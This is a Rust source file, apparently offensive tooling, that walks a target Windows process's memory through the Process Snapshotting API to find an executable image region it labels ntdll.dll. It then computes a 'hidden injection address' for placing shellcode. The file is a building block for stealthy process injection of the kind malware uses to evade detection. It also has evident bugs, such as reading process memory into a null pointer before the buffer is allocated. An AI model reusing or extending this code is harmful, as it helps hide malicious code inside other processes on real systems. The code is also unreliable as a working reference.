use Snapshotting_rs::ProcessSnapshot;
use winapi::um::winnt::{HANDLE, MEMORY_BASIC_INFORMATION, MEM_IMAGE, HEAP_ZERO_MEMORY};
use winapi::ctypes::c_void as winapi_c_void;
use std::ffi::c_void as std_c_void;
use windows::Win32::System::Diagnostics::ProcessSnapshotting::{
    HPSSWALK,
    PssWalkMarkerCreate,
    PssWalkMarkerFree,
    PssWalkSnapshot,
    PSS_WALK_VA_SPACE,
    PSS_VA_SPACE_ENTRY,
    HPSS,
    PSS_CAPTURE_FLAGS,
    PSS_CAPTURE_VA_CLONE,
    PSS_CAPTURE_VA_SPACE,
    PSS_CAPTURE_VA_SPACE_SECTION_INFORMATION,
};
use winapi::shared::winerror::ERROR_SUCCESS;
use std::ptr::null_mut;
use winapi::um::heapapi::{GetProcessHeap, HeapAlloc, HeapFree};
use winapi::um::memoryapi::ReadProcessMemory;


pub fn get_helper(stack_offset: &mut usize, _base_address: *mut winapi_c_void, _shellcode_size: usize, stack: *mut winapi_c_void, size_of_image: usize) {
    *stack_offset = 0;
    let mut j: u32 = 0;
    
    while j < size_of_image as u32 {
        *stack_offset = *stack_offset + j as usize;
        let stack_val = unsafe { 
            *((stack as *mut u8).add(j as usize) as *mut usize)
        };
        j = j + 1;
        if stack_val == 0 {
            *stack_offset = *stack_offset + j as usize;
            break;
        }
    }
}

pub fn capture_process_snapshot(handle: HANDLE) -> Result<ProcessSnapshot, String> {
    println!("Capturing process...");
    //let flags: PSS_CAPTURE_FLAGS = PSS_CAPTURE_VA_CLONE | PSS_CAPTURE_VA_SPACE | PSS_CAPTURE_VA_SPACE_SECTION_INFORMATION;
    
    match ProcessSnapshot::new(handle) {
        Ok(snap) => {
            println!("Process snapshot completed successfully");
            println!("Snapshot handle: {:?}", snap);
            println!("Snapshot will be automatically freed when it goes out of scope");
            Ok(snap)
        },
        Err(e) => Err(format!("Error capturing process snapshot: {}", e))
    }
}

pub fn get_hidden_injection_address(
    process_handle: HANDLE,
    shellcode_size: usize,
) -> Result<*mut winapi_c_void, String> {
    let snapshot = capture_process_snapshot(process_handle)?;
    let mut shellcode_location: *mut winapi_c_void = null_mut();
    let mut walker = HPSSWALK::default();
    let pss_success = unsafe { PssWalkMarkerCreate(None, &mut walker) };

    if pss_success != ERROR_SUCCESS {
        eprintln!("[!] PssWalkMarkerCreate failed: Win32 error {}", pss_success);
    } else {
        println!("PssWalkMarkerCreate succeeded");
    }

    println!("Walk Marker Handle: 0x{:?}", walker);

    let mut buffer = vec![0u8; std::mem::size_of::<PSS_VA_SPACE_ENTRY>()];
    let mut va_space_entry: PSS_VA_SPACE_ENTRY = unsafe { std::mem::zeroed() };
    
    println!("About to start walking snapshot...");
    println!("Snapshot handle raw: {:#x}", snapshot.snapshot_handle as usize);
    println!("Walker handle raw: {:#x}", walker.0 as usize);
    let mut pss_success = unsafe {
        let result = PssWalkSnapshot(
            HPSS(snapshot.snapshot_handle as *mut std_c_void),
            PSS_WALK_VA_SPACE,
            walker,
            Some(&mut buffer),
        );
        println!("Initial PssWalkSnapshot result: {} (ERROR_NOT_FOUND = 1168)", result);
        
        // Copy buffer regardless of result
        std::ptr::copy_nonoverlapping(
            buffer.as_ptr(),
            &mut va_space_entry as *mut _ as *mut u8,
            std::mem::size_of::<PSS_VA_SPACE_ENTRY>(),
        );
        result
    };

    let mut i = 0;
    while pss_success == ERROR_SUCCESS {
        println!("\nExamining region {}:", i);
        i += 1;

        let mut mem_basic_info = unsafe { std::mem::zeroed::<MEMORY_BASIC_INFORMATION>() };
        mem_basic_info.BaseAddress = va_space_entry.BaseAddress as *mut winapi_c_void;
        mem_basic_info.AllocationBase = va_space_entry.AllocationBase as *mut winapi_c_void;
        mem_basic_info.AllocationProtect = va_space_entry.AllocationProtect;
        mem_basic_info.RegionSize = va_space_entry.RegionSize;
        mem_basic_info.State = va_space_entry.State;
        mem_basic_info.Protect = va_space_entry.Protect;
        mem_basic_info.Type = va_space_entry.Type;

        println!("Region details:");
        println!("  Base Address: {:p}", mem_basic_info.BaseAddress);
        println!("  Protection: {:#x}", mem_basic_info.Protect);
        println!("  Type: {:#x}", va_space_entry.Type);
        println!("  Size: {}", va_space_entry.SizeOfImage);

        if mem_basic_info.Protect == 0x20 {
            println!("Found region with correct protection");
            if va_space_entry.Type == MEM_IMAGE {
                println!("Region is MEM_IMAGE");
                if va_space_entry.SizeOfImage > 1000000 {
                    println!("[+] ntdll.dll captured");
                    
                    let mut stack: *mut winapi_c_void = null_mut();
                    let mut stack_offset: usize = 0;

                let success = unsafe {
                    ReadProcessMemory(
                        process_handle,
                        va_space_entry.ImageBase as *const winapi_c_void,
                        stack,
                        shellcode_size,
                        null_mut()
                    )
                };

                let heap = unsafe { GetProcessHeap() };
                stack = unsafe { 
                    HeapAlloc(
                        heap,
                        HEAP_ZERO_MEMORY,
                        mem_basic_info.RegionSize as usize
                    )
                };

                    if !stack.is_null() {
                        get_helper(
                            &mut stack_offset,
                            mem_basic_info.BaseAddress,
                            shellcode_size,
                            stack,
                            va_space_entry.SizeOfImage as usize
                        );
                        
                        println!("Stack offset calculated: {:#x}", stack_offset);
                        
                        shellcode_location = ((stack_offset + mem_basic_info.BaseAddress as usize) - shellcode_size * 3) as *mut winapi_c_void;
                        println!("Shellcode location: {:p}", shellcode_location);
                        
                        unsafe { HeapFree(heap, 0, stack) };
                        unsafe { PssWalkMarkerFree(walker) };
                        return Ok(shellcode_location);
                    }
                } else {
                    println!("Region size too small: {}", va_space_entry.SizeOfImage);
                }
            } else {
                println!("Not MEM_IMAGE type: {:#x}", va_space_entry.Type);
            }
        }

        pss_success = unsafe {
            let result = PssWalkSnapshot(
                HPSS(snapshot.snapshot_handle as *mut std_c_void),
                PSS_WALK_VA_SPACE,
                walker,
                Some(&mut buffer),
            );
            println!("PssWalkSnapshot result: {}", result);
            
            // Copy buffer regardless of result
            std::ptr::copy_nonoverlapping(
                buffer.as_ptr(),
                &mut va_space_entry as *mut _ as *mut u8,
                std::mem::size_of::<PSS_VA_SPACE_ENTRY>(),
            );
            result
        };
    }

    println!("Finished walking snapshot. Examined {} regions", i);
    unsafe { PssWalkMarkerFree(walker) };
    Err("No suitable injection location found".to_string())
}